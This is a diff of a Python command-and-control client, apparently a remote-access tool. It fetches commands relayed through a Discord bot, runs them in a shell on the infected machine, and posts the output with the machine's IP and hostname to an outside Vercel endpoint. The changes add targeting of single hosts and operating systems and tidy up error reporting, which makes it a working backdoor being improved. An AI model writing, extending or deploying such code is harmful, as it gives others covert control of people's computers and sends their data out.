@@ -2,7 +2,9 @@ try:
     from requests import get, post
     from time import sleep
     from subprocess import check_output as system
+    from subprocess import CalledProcessError
     from os import chdir, uname
+    from sys import platform
 
     old_command = ""
     command = ""
@@ -31,7 +33,11 @@ while True:
                 except KeyboardInterrupt:
                     post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
         except KeyboardInterrupt:
-            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
+            try:
+                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
+            except KeyboardInterrupt:
+                print("Failed to connect to server")
+                continue
             continue
         except:
             print("Failed to connect to server")
@@ -40,20 +46,30 @@ while True:
             # execute command
         if old_command != command:
             try:
-                if command.startswith("execute "):
-                    if command.split()[1] == hostname:
-                         pass
+                if command.startswith("exename "):
+                    localcmd = command.split()
+                    if localcmd[1] == hostname:
+                        del localcmd[:2]
+                        localcmd = ' '.join(localcmd)
                     else:
                         old_command = command
                         continue
-                if command.startswith("ping"):
-                    try:
-                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
-                    except KeyboardInterrupt:
-                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
-                    except:
-                        print("Failed to connect to server")
+                if command.startswith("exeos "):
+                    command = command.split()
+                    if command[1] == platform:
+                        del command[:2]
+                        command = ' '.join(command)
+                    else:
+                        old_command = command
                         continue
+#                if command.startswith("ping"):
+#                    try:
+#                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: Pong!")
+#                    except KeyboardInterrupt:
+#                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
+#                    except:
+#                        print("Failed to connect to server")
+#                        continue
                 if command.startswith("cd"):
                     dir=command.replace('cd', '')
                     try:
@@ -74,14 +90,14 @@ while True:
                 sperror = None
                 try:
                     cmdout = system(command, shell=True).decode()
-                except subprocess.CalledProcessError as e:
+                except CalledProcessError as e:
                     try:
                         sperror=True
                     except KeyboardInterrupt:
                         continue
                     try:
-                        if e.output != "":
-                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output} exited with code {e.returncode}```- {ip}@{hostname}")
+                        if e.output.decode() != "":
+                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: {e.output.decode()} exited with code {e.returncode}```- {ip}@{hostname}")
                         else:
                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``$ {command}`` ```Error: exited with no output and code {e.returncode}```- {ip}@{hostname}")
                     except KeyboardInterrupt:
